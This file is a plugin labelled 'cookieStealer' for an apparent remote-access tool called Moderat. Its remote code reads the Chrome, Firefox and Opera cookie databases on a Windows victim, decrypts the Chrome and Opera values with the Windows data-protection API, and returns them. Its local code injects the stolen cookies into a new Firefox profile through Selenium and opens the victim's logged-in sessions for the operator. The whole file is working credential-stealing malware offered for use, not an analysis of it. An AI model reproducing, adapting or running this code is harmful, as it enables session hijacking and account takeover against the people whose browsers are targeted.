plugin_name = r"""cookieStealer"""
plugin_description = r"""Firefox & Chrome Cookie Stealer"""
r_source = r"""
import sqlite3
import win32crypt
import glob


####SETTINGS####
chrome = 1          # 0 - off, 1 - on
firefox = 1         # 0 - off, 1 - on
opera = 1         # 0 - off, 1 - on
####SETTINGS####



cookies = {}

if chrome:
    # Chrome Stealer
    chrome_cookie = glob.glob(os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies')
    if chrome_cookie:
        chrome_cookie = chrome_cookie[0]
        connection = sqlite3.connect(chrome_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
            values = v.fetchall()
            for info in values:
                payload = {
                        'domain': info[0],
                        'name': info[1],
                        'value': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],
                        'creation': info[3],
                        'expires': info[4],
                    }
                sessions.append(payload)
    else:
        sessions = []
    cookies['chrome'] = sessions

if firefox:
    # Firefox Stealer
    firefox_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
    if firefox_cookie:
        firefox_cookie = firefox_cookie[0]
        connection = sqlite3.connect(firefox_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host,name,value, creationTime, expiry, name FROM moz_cookies')
            values = v.fetchall()
            for info in values:
                payload = {
                        'domain': info[0],
                        'name': info[1],
                        'value': info[2],
                        'creation': info[3],
                        'expires': info[4],
                    }
                sessions.append(payload)
    else:
        sessions = []
    cookies['firefox'] = sessions

if opera:
    # Opera Stealer
    opera_cookie = glob.glob(os.path.join(os.getenv('APPDATA', ''), 'Opera Software/Opera*/Cookies'))
    if opera_cookie:
        opera_cookie = opera_cookie[0]
        connection = sqlite3.connect(opera_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
            values = v.fetchall()
            for info in values:
                payload = {
                        'domain': info[0],
                        'name': info[1],
                        'value': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],
                        'creation': info[3],
                        'expires': info[4],
                    }
                sessions.append(payload)
    else:
        sessions = []
    cookies['opera'] = sessions


mprint = str(cookies)
"""
l_source = r"""
# Chrome Cookies Stealer
import ast
import threading
cookies = ast.literal_eval(mprint)
log('Initializing...')

def start_session(browser, cookies, client_id, assets):

    html_payload = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Moderat - {browser}</title>
        <style>
           body{{
               background-position: center;
               background-color: #2c3e50;
               background-image: url(../bg.png);
               background-repeat: no-repeat;
               color: #c9f5f7;
               font-size: 36px;
           }}
      </style>
</head>
<body>
    <p align="center">Moderat - cookieStealer Plugin</p>
    <p align="center" style="font-size: 24px;">All Cookies Are Injected!!!!</p>
    <p align="center" style="font-size: 36px;color: limegreen">{browser}</p>
    <p align="left" style="font-size: 36px;color: limegreen">All Available Domains:</p>
    {links}
</body>
</html>
'''


    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    import shutil
    import sqlite3
    import sys

    all_domains = []

    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{0}-{1}'.format(client_id, browser))
    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
    default_cookies_path = os.path.join(assets, 'cookieStealer', 'cookies.sqlite')
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    shutil.copy2(default_cookies_path, path_to_cookies)
    with sqlite3.connect(path_to_cookies) as connection:
        cursor = connection.cursor()
        for cookie in cookies:
            all_domains.append('.'.join(cookie['domain'].split('.')[-2:]))
            try:
                v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',
                (None,'.'.join(cookie['domain'].split('.')[-2:]),0,'', cookie['name'],cookie['value'],cookie['domain'], '/',cookie['expires'],'',cookie['creation'],'',''))
                connection.commit()
            except:
                pass
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)
    ready_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', '{}-ready.html'.format(browser)).replace('\\', '/')

    # Normalize Domains

    links = ''
    domains = set(all_domains)
    for domain in sorted(domains):
        links += r'<a target="_blank" href="http://{domain}"><font color="#c9f5f7" size="4">{domain}</font></a><br>'.format(domain=domain)

    with open(ready_html, 'w') as html_file:
        html_file.write(html_payload.format(browser=browser, links=links))
    driver_chrome.get('file://'+ready_html)
threads = {}
for browser in cookies.keys():
    if len(cookies[browser]) > 0:
        threads[browser] = threading.Thread(target=start_session, args=(browser, cookies[browser], client_id, assets))
        threads[browser].start()
log('Please wait. Firefox started automatically with injected cookies')
"""